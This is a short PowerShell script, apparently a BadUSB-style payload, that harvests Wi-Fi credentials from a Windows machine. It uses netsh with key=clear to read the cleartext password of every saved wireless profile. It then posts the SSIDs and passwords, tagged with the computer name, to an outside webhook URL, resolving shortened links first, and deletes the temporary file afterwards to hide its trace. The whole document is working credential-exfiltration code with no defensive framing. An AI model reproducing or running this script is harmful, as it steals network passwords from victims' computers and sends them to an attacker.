$whuri = "$dc"
# shortened URL Detection
if ($whuri.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $whuri = (irm $whuri).url}

$outfile=""
$a=0
$ws=(netsh wlan show profiles) -replace ".*:\s+"
foreach($s in $ws){
    if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){
        $ssid=$s.Trim()
            if($s -Match ":"){
                $ssid=$s.Split(":")[1].Trim()
            }
            $pw=(netsh wlan show profiles name=$ssid key=clear)
            $pass="None"
                foreach($p in $pw){
                    if($p -Match "Key Content"){
                        $pass=$p.Split(":")[1].Trim()
                        $outfile+="SSID: $ssid : Password: $pass`n"
                    }
                }
            }
            $a++
        }

$outfile | Out-File -FilePath "$env:temp\info.txt" -Encoding ASCII -Append

$Pathsys = "$env:temp\info.txt"
$msgsys = Get-Content -Path $Pathsys -Raw 
$escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsgsys} | ConvertTo-Json
Start-Sleep 1
Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys
Remove-Item -Path $Pathsys -force
